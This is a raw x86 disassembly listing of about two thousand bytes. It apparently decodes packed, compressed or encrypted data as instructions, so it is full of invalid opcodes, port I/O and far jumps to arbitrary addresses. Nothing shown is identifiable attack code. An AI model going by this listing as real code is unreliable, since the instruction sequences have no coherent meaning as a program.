  41f3fd:	ins    DWORD PTR es:[edi],dx
  41f3fe:	imul   esi,DWORD PTR [edx-0xd],0x5e
  41f402:	push   ecx
  41f403:	jb     0x41f400
  41f405:	pop    esi
  41f406:	push   ecx
  41f407:	jae    0x41f3cb
  41f409:	push   eax
  41f40a:	dec    esi
  41f40b:	popa   
  41f40c:	mov    edx,0xb852007b
  41f411:	inc    ebp
  41f412:	je     0x41f458
  41f414:	mov    esi,0x13636150
  41f419:	inc    ebp
  41f41a:	jb     0x41f495
  41f41c:	xchg   edi,eax
  41f41d:	outs   dx,BYTE PTR ds:[esi]
  41f41e:	imul   esi,DWORD PTR [edx+0x3],0x5e
  41f422:	dec    edi
  41f423:	outs   dx,DWORD PTR ds:[esi]
  41f424:	rcr    DWORD PTR [edx+0x73],0x61
  41f428:	adc    eax,0xf8535c4a
  41f42d:	pop    ecx
  41f42e:	je     0x41f498
	...
  41f458:	add    BYTE PTR [eax],al
  41f45a:	ds push esp
  41f45c:	rcr    BYTE PTR ss:[bp+0x2016],1
  41f462:	jmp    0x1898:0xd8682396
  41f469:	ins    DWORD PTR es:[edi],dx
  41f46a:	fstp   DWORD PTR [edx+0x519a711d]
  41f470:	sbb    eax,0x19467a62
  41f475:	jbe    0x41f41a
  41f477:	push   0x62906d43
  41f47c:	sbb    eax,0x175b9261
  41f481:	outs   dx,BYTE PTR ds:[esi]
  41f482:	lea    esi,[esp+esi*1]
  41f485:	arpl   WORD PTR [edx+esi*1+0x2b6a721e],cx
  41f48c:	adc    DWORD PTR [ebx+0x3e],esp
  41f48f:	xor    BYTE PTR [eax],0x50
  41f492:	push   ds
  41f493:	cmc    
  41f494:	aaa    
  41f495:	dec    esi
  41f496:	xchg   edx,eax
  41f497:	out    0x37,al
  41f499:	dec    esp
  41f49a:	ds cli 
  41f49c:	sub    al,0x50
  41f49e:	jge    0x41f469
  41f4a0:	add    BYTE PTR ss:[eax],ah
  41f4a3:	in     al,0x12
  41f4a5:	ds enterw 0x7230,0x51
  41f4ab:	sbb    bl,BYTE PTR [edx]
  41f4ad:	ins    BYTE PTR es:[edi],dx
  41f4ae:	and    esp,ebp
  41f4b0:	add    BYTE PTR [ecx-0x72087fcd],al
  41f4b6:	in     eax,dx
  41f4b7:	dec    ebx
  41f4b8:	sbb    DWORD PTR [ecx-0x2f],esi
  41f4bb:	push   eax
  41f4bc:	sbb    al,0x74
	...
  41f4e6:	add    BYTE PTR [eax],al
  41f4e8:	adc    al,ah
  41f4ea:	retf   0x612c
  41f4ed:	xor    al,0x19
  41f4ef:	je     0x41f503
  41f4f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4f2:	adc    al,0x3a
  41f4f4:	push   ecx
  41f4f5:	and    DWORD PTR [ecx],eax
  41f4f7:	repnz mov ds:0x5b212ccb,ax
  41f4fe:	out    0x18,eax
  41f500:	out    dx,al
  41f501:	mov    edi,0xb23e2359
  41f506:	dec    eax
  41f507:	sbb    ah,dl
  41f509:	js     0x41f54e
  41f50b:	and    ecx,edx
  41f50d:	pop    edx
  41f50e:	es xor eax,0x1133c0db
  41f514:	loope  0x41f4c2
  41f516:	dec    esp
  41f517:	sub    BYTE PTR [ebx-0x6ee9bb55],cl
  41f51d:	jnp    0x41f559
  41f51f:	sbb    DWORD PTR [eax-0x53dce951],esp
  41f525:	mov    esi,0xac7937e7
  41f52a:	adc    esp,esp
  41f52c:	jge    0x41f4e0
  41f52e:	stc    
  41f52f:	push   ds
  41f530:	lahf   
  41f531:	scas   eax,DWORD PTR es:[edi]
  41f532:	push   cs
  41f533:	push   ss
  41f534:	mov    DWORD PTR [edi+eiz*8+0x37],ebp
  41f538:	cdq    
  41f539:	lods   al,BYTE PTR ds:[esi]
  41f53a:	repz jecxz 0x41f5b5
  41f53d:	mov    ecx,0xb7890fda
  41f542:	retf   
  41f543:	jecxz  0x41f5b6
  41f545:	mov    edx,0x983e1bdb
  41f54a:	xlat   BYTE PTR ds:[ebx]
  41f54b:	push   ds
	...
  41f574:	add    BYTE PTR [eax],al
  41f576:	dec    esp
  41f577:	mov    edx,0x96723c15
  41f57c:	stos   DWORD PTR es:[edi],eax
  41f57d:	daa    
  41f57e:	dec    edi
  41f57f:	mov    bl,0xcc
  41f581:	pop    ss
  41f582:	sub    al,BYTE PTR [edi-0x46e2ec42]
  41f588:	ret    
  41f589:	and    al,0x1b
  41f58b:	mov    dh,0x8c
  41f58d:	and    dl,BYTE PTR [eax]
  41f58f:	mov    edi,0xac2110e7
  41f594:	test   BYTE PTR [ecx],ah
  41f596:	or     ch,BYTE PTR [ebx-0x53efea86]
  41f59c:	int    0x25
  41f59e:	sbb    DWORD PTR [ecx+0x6821e900],edi
  41f5a4:	popa   
  41f5a5:	test   bl,bh
  41f5a7:	lahf   
  41f5a8:	push   esp
  41f5a9:	jmp    0x55a8abda
  41f5ae:	xor    DWORD PTR [eax+0x68264c72],ecx
  41f5b4:	popa   
  41f5b5:	inc    esp
  41f5b6:	cld    
  41f5b7:	lahf   
  41f5b8:	push   esp
  41f5b9:	jmp    0xe99582c4
  41f5be:	or     al,0x96
  41f5c0:	inc    esi
  41f5c1:	sbb    eax,0x24526869
  41f5c6:	call   0xaa4d:0x86c
  41f5cc:	arpl   WORD PTR [edx],bx
  41f5ce:	push   esi
  41f5cf:	(bad)  
  41f5d0:	ja     0x41f5eb
  41f5d2:	pop    edi
  41f5d3:	xchg   edi,eax
  41f5d4:	or     esp,DWORD PTR [bp-0x5e]
  41f5d8:	inc    ecx
  41f5d9:	sub    eax,DWORD PTR [eax]
	...
  41f603:	add    bl,dh
  41f605:	popf   
  41f606:	xor    ch,BYTE PTR [edx]
  41f608:	jmp    0x3471:0xdb12b9d
  41f60f:	mov    esp,0xaa3f6901
  41f614:	push   es
  41f615:	call   0x1834:0x750ea741
  41f61c:	xor    DWORD PTR [ecx+0x34],0xffffffa4
  41f620:	out    dx,eax
  41f621:	outs   dx,BYTE PTR ds:[esi]
  41f622:	inc    esi
  41f623:	(bad)  
  41f624:	clc    
  41f625:	outs   dx,BYTE PTR ds:[esi]
  41f626:	jnp    0x41f611
  41f628:	or     al,0x96
  41f62a:	inc    esi
  41f62b:	popf   
  41f62c:	push   0x59a45268
  41f631:	call   0x9a63:0xaa4c886c
  41f638:	pop    ecx
  41f639:	(bad)  
  41f63a:	ja     0x41f5d5
  41f63c:	pop    esi
  41f63d:	xchg   edi,eax
  41f63e:	mov    ebx,DWORD PTR [bx+di-0x5e]
  41f642:	aaa    
  41f643:	add    dl,bl
  41f645:	sahf   
  41f646:	xor    DWORD PTR ds:0x2d3609ca,esi
  41f64c:	stos   BYTE PTR es:[edi],al
  41f64d:	push   cs
  41f64e:	das    
  41f64f:	xor    dh,BYTE PTR [edx+0x48353417]
  41f655:	add    bh,BYTE PTR [edi]
  41f657:	inc    ebx
  41f658:	dec    eax
  41f659:	push   ss
  41f65a:	sub    al,BYTE PTR [ebp+0x3b]
  41f65d:	pop    ss
  41f65e:	das    
  41f65f:	xor    eax,0x372d1719
  41f664:	inc    esp
  41f665:	or     DWORD PTR [eax+0x7d],eax
	...
  41f690:	add    BYTE PTR [eax],al
  41f692:	push   edi
  41f693:	pop    eax
  41f694:	gs jae 0x41f621
  41f697:	inc    ebp
  41f698:	je     0x41f70a
  41f69a:	je     0x41f6e5
  41f69c:	jbe    0x41f711
  41f69e:	adc    DWORD PTR [eax+0x6e],ecx
  41f6a1:	imul   edx,DWORD PTR [edi],0x4a736556
  41f6a7:	inc    ebp
  41f6a8:	je     0x41f71a
  41f6aa:	rol    DWORD PTR [edi+0x6e],1
  41f6ad:	imul   edx,DWORD PTR [edi],0x29505469
  41f6b3:	dec    esi
  41f6b4:	jne    0x41f717
  41f6b6:	dec    eax
  41f6b7:	jl     0x41f72b
  41f6b9:	cmp    DWORD PTR cs:[ebx+0x70],ecx
  41f6bd:	add    BYTE PTR [ecx-0xfa9af8a],bl
  41f6c3:	push   edi
  41f6c4:	pop    ebp
  41f6c5:	or     cl,BYTE PTR [di+0x2e]
  41f6c9:	jno    0x41f6cf
  41f6cb:	pop    ebx
  41f6cc:	pop    esp
  41f6cd:	push   edx
  41f6ce:	out    dx,eax
  41f6cf:	inc    edi
  41f6d0:	outs   dx,BYTE PTR ds:[esi]
  41f6d1:	outs   dx,DWORD PTR ds:[esi]
  41f6d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6d3:	dec    ebp
  41f6d4:	data16 je 0x41f718
  41f6d7:	jp     0x41f744
  41f6d9:	ins    DWORD PTR es:[edi],dx
  41f6da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6db:	push   eax
  41f6dc:	outs   dx,DWORD PTR ds:[esi]
  41f6dd:	jae    0x41f663
  41f6df:	adc    BYTE PTR [ecx+0x6c],ah
  41f6e2:	mov    bl,0x5a
  41f6e4:	dec    esi
  41f6e5:	push   ebx
  41f6e6:	ds loope 0x41f70e
  41f6e9:	inc    edi
  41f6ea:	and    bl,bl
  41f6ec:	or     al,0x0
  41f6ee:	clc    
  41f6ef:	shl    BYTE PTR [ecx],0x5d
  41f6f2:	in     eax,dx
  41f6f3:	retf   
  41f6f4:	pcmpeqb mm0,QWORD PTR [eax]
	...
  41f71f:	add    dl,ah
  41f721:	fmul   QWORD PTR ds:0x31c63e6e
  41f727:	push   ecx
  41f728:	cld    
  41f729:	xchg   edx,eax
  41f72a:	packsswb mm5,QWORD PTR [eax]
  41f72d:	push   eax
  41f72e:	and    eax,DWORD PTR [ebx+eiz*8-0x70]
  41f732:	adc    esp,DWORD PTR [ebx+ebx*8+0x71]
  41f736:	or     eax,0x1296e066
  41f73b:	add    ch,ch
  41f73d:	jle    0x41f77e
  41f73f:	inc    edi
  41f740:	xchg   edx,eax
  41f741:	ja     0x41f778
  41f743:	pop    ebp
  41f744:	js     0x41f7a8
  41f746:	sbb    eax,0x1d487763
  41f74b:	imul   edi,DWORD PTR [esi],0x64
  41f74e:	aaa    
  41f74f:	das    
  41f750:	dec    edi
  41f751:	ins    DWORD PTR es:[edi],dx
  41f752:	cmp    esp,DWORD PTR [ebx-0x76]
  41f755:	jnp    0x41f76d
  41f757:	je     0x41f6fc
  41f759:	and    dl,BYTE PTR [ebx]
  41f75b:	pop    edi
  41f75c:	xchg   edx,eax
  41f75d:	imul   ebx,DWORD PTR ds:0x13608d77,0x37443e74
  41f767:	das    
  41f768:	das    
  41f769:	sbb    eax,0xc6a7342
  41f76e:	push   ds
  41f76f:	outs   dx,BYTE PTR ds:[esi]
  41f770:	push   edx
  41f771:	sbb    esp,DWORD PTR [eax]
  41f773:	pop    edi
  41f774:	dec    edx
  41f775:	pop    ds
  41f776:	add    DWORD PTR [eax+0x75],edx
  41f779:	and    edx,edx
  41f77b:	push   eax
  41f77c:	jp     0x41f740
  41f77e:	and    eax,DWORD PTR [ebx+eiz*1+0x11]
  41f782:	emms   
	...
  41f7ac:	add    BYTE PTR [eax],al
  41f7ae:	lock add BYTE PTR cs:[eax-0xb],dl
  41f7b3:	pop    edx
  41f7b4:	fcom   st(2)
  41f7b6:	add    bl,BYTE PTR [ebp-0x75e2e167]
  41f7bc:	adc    DWORD PTR [edx+ecx*1],0x5b
  41f7c0:	out    0x3,eax
  41f7c2:	ds pop ebx
  41f7c4:	out    0x3,eax
  41f7c6:	ds pop ebx
  41f7c8:	out    0x3,eax
  41f7ca:	ds pop ebx
  41f7cc:	out    0x3,eax
  41f7ce:	ds pop ebx
  41f7d0:	out    0x3,eax
  41f7d2:	ds pop ebx
  41f7d4:	out    0x3,eax
  41f7d6:	ds pop ebx
  41f7d8:	out    0x3,eax
  41f7da:	ds pop ebx
  41f7dc:	out    0x3,eax
  41f7de:	ds pop ebx
  41f7e0:	out    0x10,eax
  41f7e2:	fnstenv [esi+0x69dd1050]
  41f7e8:	or     eax,0xe7b7aa20
  41f7ed:	adc    BYTE PTR [ecx-0x62efbf49],ah
  41f7f3:	push   0xbeae1546
  41f7f8:	or     eax,0x3aa8f04
  41f7fd:	sbb    ecx,DWORD PTR [edx-0x60db2542]
  41f803:	mov    bh,0x16
  41f805:	adc    DWORD PTR [ebp+0x6a12fa5b],ebx
  41f80b:	mov    dl,0xfb
  41f80d:	push   ds
  41f80e:	das    
  41f80f:	test   bh,dh
  41f811:	adc    DWORD PTR [eax],eax
	...
  41f83b:	add    BYTE PTR [ebp-0x55],bl
  41f83e:	enter  0x5d11,0x5b
  41f842:	ficom  DWORD PTR [edx]
  41f844:	push   0xffffffb2
  41f846:	fistp  DWORD PTR [esi]
  41f848:	je     0xab9f0828
  41f84e:	out    0x10,eax
  41f850:	push   ecx
  41f851:	mov    bh,0xd0
  41f853:	nop    DWORD PTR [eax+0x0]
  41f857:	xchg   esi,eax
  41f858:	pop    esi
  41f859:	mov    dh,0x6c
  41f85b:	mov    ah,0x50
  41f85d:	mov    ch,0x5d
  41f85f:	mov    esi,DWORD PTR [edi+ebp*4]
  41f862:	arpl   WORD PTR [edx-0x7a9055c3],bx
  41f868:	xor    al,0xaf
  41f86a:	arpl   dx,bx
  41f86c:	bound  edi,QWORD PTR [edx-0x4fcf6a93]
  41f872:	outs   dx,BYTE PTR ds:[esi]
  41f873:	sahf   
  41f874:	pop    ds
  41f875:	mov    bh,0x6d
  41f877:	mov    edi,DWORD PTR ds:0x377e6b5b
  41f87d:	stos   BYTE PTR es:[edi],al
  41f87e:	outs   dx,DWORD PTR ds:[esi]
  41f87f:	push   ebp
  41f880:	push   ebx
  41f881:	test   al,0x63
  41f883:	sbb    cl,BYTE PTR [edi+edi*4]
  41f886:	ins    BYTE PTR es:[edi],dx
  41f887:	inc    ebp
  41f888:	cmp    ch,BYTE PTR [edx-0x57a4c291]
  41f88e:	arpl   dx,di
  41f890:	pop    esp
  41f891:	mov    bh,0x70
  41f893:	inc    esp
  41f894:	sub    al,0x24
  41f896:	jb     0x41f8d0
  41f898:	cs mov ebp,0x86714474
  41f89e:	popa   
  41f89f:	adc    eax,0x0
	...
  41f8c8:	add    BYTE PTR [eax],al
  41f8ca:	sub    eax,0x10e963ab
  41f8cf:	mov    ch,0x6c
  41f8d1:	add    BYTE PTR [esi],dl
  41f8d3:	mov    ecx,0xaa122e31
  41f8d8:	arpl   cx,di
  41f8da:	sbb    ch,BYTE PTR [edx-0x4b0f169d]
  41f8e0:	ins    BYTE PTR es:[edi],dx
  41f8e1:	add    dh,dh
  41f8e3:	mov    eax,0xa7f10e31
  41f8e8:	arpl   cx,bx
  41f8ea:	cmp    eax,0xeacd6faa
  41f8ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8f0:	arpl   WORD PTR [edx],bx
  41f8f2:	fnstsw WORD PTR [edx-0x4f394293]
  41f8f8:	outs   dx,BYTE PTR ds:[esi]
  41f8f9:	add    BYTE PTR [eax-0x7d8b89c3],bl
  41f8ff:	sub    al,0xfd
  41f901:	jb     0x41f8f9
  41f903:	xor    esp,DWORD PTR [esi+0x74]
  41f906:	sub    BYTE PTR [ebx+ebx*2+0x63],0xc8
  41f90b:	xor    esi,DWORD PTR [edx+0x6d]
  41f90e:	leave  
  41f90f:	cmp    BYTE PTR [edi+0x6c],bl
  41f912:	mov    eax,0x97fffd3d
  41f917:	push   edi
  41f918:	add    BYTE PTR [eax],al
  41f91a:	xchg   edi,eax
  41f91b:	push   edi
  41f91c:	add    BYTE PTR [eax],al
  41f91e:	addr16 push edi
  41f920:	add    BYTE PTR [eax],al
  41f922:	addr16 push edi
  41f924:	add    BYTE PTR [eax],al
  41f926:	push   edi
  41f927:	push   edi
  41f928:	add    BYTE PTR [eax],al
  41f92a:	push   edi
  41f92b:	push   edi
	...
  41f958:	addr16 push edi
  41f95a:	add    BYTE PTR [eax],al
  41f95c:	addr16 push edi
  41f95e:	add    BYTE PTR [eax],al
  41f960:	out    0x2c,eax
  41f962:	ins    BYTE PTR es:[edi],dx
  41f963:	data16 out dx,al
  41f965:	sub    ah,BYTE PTR [edx+0x73]
  41f968:	dec    ecx
  41f969:	xor    BYTE PTR [ebx+0x69],ch
  41f96c:	daa    
  41f96d:	movq   mm5,QWORD PTR [edi-0x7f]
  41f971:	xor    BYTE PTR [ecx+0x65],ch
  41f974:	pop    ss
  41f975:	adc    BYTE PTR [eax+0x52],dh
  41f978:	inc    edx
  41f979:	sub    ebx,DWORD PTR [esi+0x74]
  41f97c:	ds and eax,0x38470062
  41f982:	jno    0x41f9ec
  41f984:	pop    ss
  41f985:	divps  xmm6,XMMWORD PTR [edi+ecx*2+0x3]
  41f98a:	ins    BYTE PTR es:[edi],dx
  41f98b:	inc    ebp
  41f98c:	out    dx,eax
  41f98d:	xor    edi,ebp
  41f98f:	outs   dx,DWORD PTR ds:[esi]
  41f990:	in     eax,0x33
  41f992:	arpl   WORD PTR [ebx+0x49],si
  41f995:	xor    DWORD PTR [eax+0x0],esi
  41f998:	hlt    
  41f999:	das    
  41f99a:	outs   dx,BYTE PTR fs:[esi]
  41f99c:	ds sbb edi,ebp
  41f99f:	jo     0x41f9b9
  41f9a1:	add    eax,0xe0576bf4
  41f9a6:	out    0xff,eax
  41f9a8:	sub    al,0xb
  41f9aa:	jmp    0x322d:0xf61a216d
  41f9b1:	in     al,dx
  41f9b2:	hlt    
  41f9b3:	jmp    FWORD PTR [ebx+ecx*8]
  41f9b6:	jmp    0xf6142328
  41f9bb:	xor    DWORD PTR [eax],eax
	...
  41f9e5:	add    BYTE PTR [eax-0x40],ah
  41f9e8:	clc    
  41f9e9:	jae    0x41fa29
  41f9eb:	(bad)
  41f9ee:	adc    cl,cl
  41f9f0:	out    dx,al
  41f9f1:	jo     0x41fa20
  41f9f3:	adc    dh,ch
  41f9f5:	ja     0x41f9e1
  41f9f7:	xor    esp,DWORD PTR [esi]
  41f9f9:	xor    bl,ch
  41f9fb:	xor    esp,DWORD PTR [esi]
  41f9fd:	xor    bl,dl
  41f9ff:	xor    esp,DWORD PTR [edx+esi*1]
  41fa02:	jecxz  0x41fa37
  41fa04:	aam    0x42
  41fa06:	add    ch,BYTE PTR [edi-0x3d]
  41fa09:	push   ebx
  41fa0a:	push   ds
  41fa0b:	pushf  
  41fa0c:	out    dx,eax
  41fa0d:	jo     0x41f9d9
  41fa0f:	mov    ecx,esp
  41fa11:	push   0xffffffa3
  41fa13:	push   eax
  41fa14:	and    al,0x63
  41fa16:	mov    al,ds:0xae76f695
  41fa1b:	push   0x458b63e5
  41fa20:	in     eax,0x71
  41fa22:	test   al,0x53
  41fa24:	in     eax,dx
  41fa25:	bound  esp,QWORD PTR [edx+0x14]
  41fa28:	out    0x6d,al
  41fa2a:	popf   
  41fa2b:	inc    esi
  41fa2c:	stc    
  41fa2d:	outs   dx,DWORD PTR ds:[esi]
  41fa2e:	mov    cl,BYTE PTR [edi-0x18]
  41fa31:	dec    edi
  41fa32:	pop    edi
  41fa33:	and    eax,0x266174f4
  41fa38:	in     eax,0x1f
  41fa3a:	add    BYTE PTR [esi-0x31],0x4a
  41fa3e:	push   ds
  41fa3f:	pop    ebx
  41fa40:	aam    0xf0
  41fa42:	push   edi
  41fa43:	or     bl,0xf0
  41fa46:	pop    edx
  41fa47:	mov    ah,0xc5
  41fa49:	hlt    
	...
  41fa72:	add    BYTE PTR [eax],al
  41fa74:	leave  
  41fa75:	xchg   edi,eax
  41fa76:	shl    ch,0x5c
  41fa79:	mov    ecx,0x85b9fbd6
  41fa7e:	lods   al,BYTE PTR ds:[esi]
  41fa7f:	lock aaa 
  41fa81:	mov    ah,0xc3
  41fa83:	out    dx,eax
  41fa84:	or     BYTE PTR [edi-0x5b],bh
  41fa87:	jmp    0x7f11:0xf08db82f
  41fa8e:	out    0xd4,eax
  41fa90:	and    bh,BYTE PTR [ecx-0x53170765]
  41fa96:	test   bh,bl
  41fa98:	hlt    
  41fa99:	mov    cl,0x81
  41fa9b:	jmp    0x7025:0x388aee5
  41faa2:	les    eax,FWORD PTR [ebx]
  41faa4:	loopne 0x41fa4c
  41faa6:	ja     0x41fae5
  41faa8:	adc    esi,DWORD PTR [edx-0x19]
  41faab:	jmp    0x41fa7a
  41faad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faae:	push   edi
  41faaf:	and    esi,DWORD PTR ds:[edx-0x19]
  41fab3:	jmp    0x41fa82
  41fab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fab6:	push   edi
  41fab7:	cmc    
  41fab8:	pop    es
  41fab9:	jb     0x41fad1
  41fabb:	add    al,0xa0
  41fabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fabe:	aaa    
  41fabf:	xor    bh,BYTE PTR [esi]
  41fac1:	mov    ecx,0x999cf640
  41fac6:	adc    edx,esp
  41fac8:	scas   al,BYTE PTR es:[edi]
  41fac9:	mov    dl,0x1b
  41facb:	out    0x8e,eax
  41facd:	jno    0x41fad2
  41facf:	jecxz  0x41fa5e
  41fad1:	pop    ebx
  41fad2:	cmp    ah,bh
  41fad4:	push   0xf1fe8e
	...
  41fb01:	add    BYTE PTR [esi-0x65fbff4a],dl
  41fb07:	mov    cs,WORD PTR [esi]
  41fb09:	(bad)  
  41fb0a:	pop    eax
  41fb0b:	scas   eax,DWORD PTR es:[edi]
  41fb0c:	add    BYTE PTR ds:0x45184dd,al
  41fb12:	fst    QWORD PTR [ebp-0x42152893]
  41fb18:	ja     0x41fad7
  41fb1a:	cmp    eax,0xe2c66c99
  41fb1f:	mov    bl,0x0
  41fb21:	lods   eax,DWORD PTR ds:[esi]
  41fb22:	div    DWORD PTR [ebp+ebp*2+0x4284aaca]
  41fb29:	mov    ebx,0xcc71a7ae
  41fb2e:	mov    bl,0x84
  41fb30:	add    BYTE PTR [esi+ebp*4-0x566a985e],bl
  41fb37:	add    DWORD PTR [eax],0x7aaf80bd
  41fb3d:	sbb    BYTE PTR [ecx+0x6dad5fb4],0xaa
  41fb44:	ins    DWORD PTR es:[edi],dx
  41fb45:	(bad)  
  41fb46:	fs mov ah,0x63
  41fb49:	jp     0x41fadc
  41fb4b:	and    BYTE PTR [edx-0x7a],dl
  41fb4e:	push   edi
  41fb4f:	lods   al,BYTE PTR ds:[esi]
  41fb50:	jne    0x41fada
  41fb52:	imul   edi,DWORD PTR [ebp-0x4298caa4],0x61
  41fb59:	push   ecx
  41fb5a:	js     0x41fae8
  41fb5c:	push   eax
  41fb5d:	jmp    0x25b2abe4
  41fb62:	push   ebx
  41fb63:	stos   BYTE PTR es:[edi],al
  41fb64:	add    BYTE PTR ds:0x0,dh
	...
  41fb8e:	add    BYTE PTR [eax],al
  41fb90:	sub    DWORD PTR [ebx-0x46f9b2a1],edi
  41fb96:	jb     0x41fb81
  41fb98:	pop    ds
  41fb99:	scas   eax,DWORD PTR es:[edi]
  41fb9a:	ins    DWORD PTR es:[edi],dx
  41fb9b:	inc    edx
  41fb9c:	das    
  41fb9d:	xor    DWORD PTR [edx+0x12],0x155fb768
  41fba4:	cmp    cl,BYTE PTR [edx-0x66e8e299]
  41fbaa:	outs   dx,BYTE PTR ds:[esi]
  41fbab:	pop    es
  41fbac:	adc    DWORD PTR [esi+0x4f],ebp
  41fbaf:	add    BYTE PTR [ecx],ch
  41fbb1:	pop    es
  41fbb2:	std    
  41fbb3:	dec    esi
  41fbb4:	cmp    ebp,DWORD PTR [esi]
  41fbb6:	imul   eax,DWORD PTR [eax],0x19
  41fbb9:	ss jae 0x41fc2b
  41fbbc:	in     eax,0x2e
  41fbbe:	jno    0x41fc25
  41fbc0:	hlt    
  41fbc1:	ins    DWORD PTR es:[edi],dx
  41fbc2:	fs popa 
  41fbc4:	jmp    0x41fc21
  41fbc6:	push   ebx
  41fbc7:	imul   eax,DWORD PTR [ecx],0xd7505116
  41fbcd:	sub    al,0x66
  41fbcf:	je     0x41fb5b
  41fbd1:	sub    al,0x2b
  41fbd3:	test   DWORD PTR fs:[ebx+0x3f],ebx
  41fbd7:	dec    esp
  41fbd8:	les    ecx,FWORD PTR [esi]
  41fbda:	inc    ecx
  41fbdb:	pop    esp
  41fbdc:	in     al,dx
  41fbdd:	sub    ax,0x7643
  41fbe1:	pop    ss
  41fbe2:	xor    al,0x34
  41fbe4:	jbe    0x41fc50
  41fbe6:	cmp    eax,0x2a196a39
  41fbeb:	xor    DWORD PTR [esi+0x37],esp
  41fbee:	das    
  41fbef:	sub    eax,0x3035167f
	...
  41fc1c:	add    BYTE PTR [eax],al
  41fc1e:	sub    BYTE PTR [ebx+0x30],0x38
  41fc22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc23:	push   ss
  41fc24:	inc    ecx
  41fc25:	inc    edx
  41fc26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc27:	imul   eax,DWORD PTR [esi+0x46],0x495c5a3b
  41fc2e:	add    DWORD PTR [edi],eax
  41fc30:	outs   dx,DWORD PTR ds:[esi]
  41fc31:	outs   dx,DWORD PTR ds:[esi]
  41fc32:	hlt    
  41fc33:	or     esp,DWORD PTR [edx+0x72]
  41fc36:	jmp    0x35756b6c
  41fc3b:	pop    ebx
  41fc3c:	outs   dx,DWORD PTR ds:[esi]
  41fc3d:	gs jne 0x41fc65
  41fc40:	bound  esi,QWORD PTR [edx+0x64]
  41fc43:	ins    DWORD PTR es:[edi],dx
  41fc44:	js     0x41fcb3
  41fc46:	arpl   WORD PTR [edi+0x5c],dx
  41fc49:	inc    esi
  41fc4a:	pop    ebx
  41fc4b:	pop    es
  41fc4c:	inc    esp
  41fc4d:	sub    esp,DWORD PTR gs:[ebx]
  41fc50:	bound  esi,QWORD PTR [edx+0x3e]
  41fc53:	xor    al,0xc8
  41fc55:	push   eax
  41fc56:	push   0x58
  41fc58:	loop   0x41fc8b
  41fc5a:	sub    BYTE PTR [eax-0x1d],dl
  41fc5d:	jae    0x41fc9d
  41fc5f:	inc    ebx
  41fc60:	enter  0x725e,0x53
  41fc64:	cs fs pop edi
  41fc67:	sub    BYTE PTR [ecx],al
  41fc69:	pop    esp
  41fc6a:	add    DWORD PTR [ecx],0xfffffff5
  41fc6d:	jo     0x41fcd0
  41fc6f:	push   ss
  41fc70:	cmc    
  41fc71:	pop    ebx
  41fc72:	jg     0x41fc6c
  41fc74:	ret    0x6e53
  41fc77:	xor    al,0xcc
  41fc79:	ins    DWORD PTR es:[edi],dx
  41fc7a:	xor    cl,BYTE PTR [edi]
  41fc7c:	out    dx,eax
  41fc7d:	ins    DWORD PTR es:[edi],dx
  41fc7e:	sbb    ebp,eax
  41fc80:	and    BYTE PTR [ebx+0x0],al
	...
  41fcab:	add    BYTE PTR [esi],ah
  41fcad:	in     al,0xec
  41fcaf:	ins    BYTE PTR es:[edi],dx
  41fcb0:	sub    al,0x17
  41fcb2:	out    dx,eax
  41fcb3:	push   eax
  41fcb5:	retf   0x66ea
  41fcb8:	and    bh,dl
  41fcba:	hlt    
  41fcbb:	inc    eax
  41fcbc:	pop    ds
  41fcbd:	shr    eax,1
  41fcbf:	(bad)  
  41fcc0:	std    
  41fcc1:	shl    edi,0x63
  41fcc4:	jecxz  0x41fc8b
  41fcc6:	hlt    
  41fcc7:	data16 (bad) 
  41fcca:	icebp  
  41fccb:	(bad)  
  41fccc:	cli    
  41fccd:	shl    BYTE PTR [eax],0x47
  41fcd0:	sti    
  41fcd1:	adc    eax,ebx
  41fcd3:	push   ebx
  41fcd4:	out    dx,al
  41fcd5:	push   ebx
  41fcd6:	aam    0x5e
  41fcd8:	int    0x80
  41fcda:	rep ins BYTE PTR es:[edi],dx
  41fcdc:	int3   
  41fcdd:	(bad)  
  41fcde:	out    dx,eax
  41fcdf:	(bad)  
  41fce0:	std    
  41fce1:	arpl   cx,ax
  41fce3:	dec    edi
  41fce4:	xchg   DWORD PTR [edx+0x24],ebx
  41fce7:	add    BYTE PTR [esi+0x6a],bh
  41fcea:	xor    edi,DWORD PTR [edx+eiz*1]
  41fced:	stos   BYTE PTR es:[edi],al
  41fcee:	dec    ebx
  41fcef:	psraw  mm5,QWORD PTR [esi+0x4]
  41fcf3:	stos   BYTE PTR es:[edi],al
  41fcf4:	ds pop ebx
  41fcf6:	adc    dh,al
  41fcf8:	and    ebx,DWORD PTR [ecx+esi*1+0x51374a35]
  41fcff:	dec    ebp
  41fd00:	xor    esi,ebx
  41fd02:	or     eax,DWORD PTR [esp+eiz*4]
  41fd05:	pop    edx
  41fd06:	adc    dh,al
  41fd08:	jecxz  0x41fca2
  41fd0a:	xor    DWORD PTR ds:0x4d31372a,esi
	...
  41fd38:	add    BYTE PTR [eax],al
  41fd3a:	xor    esi,ebx
  41fd3c:	jmp    0x41fd41
  41fd3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd3f:	pop    edx
  41fd40:	rol    ch,1
  41fd42:	jecxz  0x41fda1
  41fd44:	out    0x3,eax
  41fd46:	ds js  0x41fd60
  41fd49:	xor    ah,BYTE PTR [esi+0x5b]
  41fd4c:	mov    edx,0xbea723ec
  41fd51:	loop   0x41fd82
  41fd53:	mov    eax,0xba20ce9b
  41fd58:	mov    ecx,0xc5ae2eec
  41fd5d:	div    ebp
  41fd5f:	xchg   ebx,eax
  41fd60:	xchg   ebp,eax
  41fd61:	neg    DWORD PTR [ecx+ebp*4]
  41fd64:	(bad)  
  41fd65:	out    0xd,al
  41fd67:	jnp    0x41fd15
  41fd69:	sti    
  41fd6a:	adc    DWORD PTR [edi-0x57230e82],ebp
  41fd70:	mov    ds:0x84a6e3ca,eax
  41fd75:	out    dx,eax
  41fd76:	aad    0xb3
  41fd78:	lods   eax,DWORD PTR ds:[esi]
  41fd79:	in     al,dx
  41fd7a:	out    dx,eax
  41fd7b:	scas   eax,DWORD PTR es:[edi]
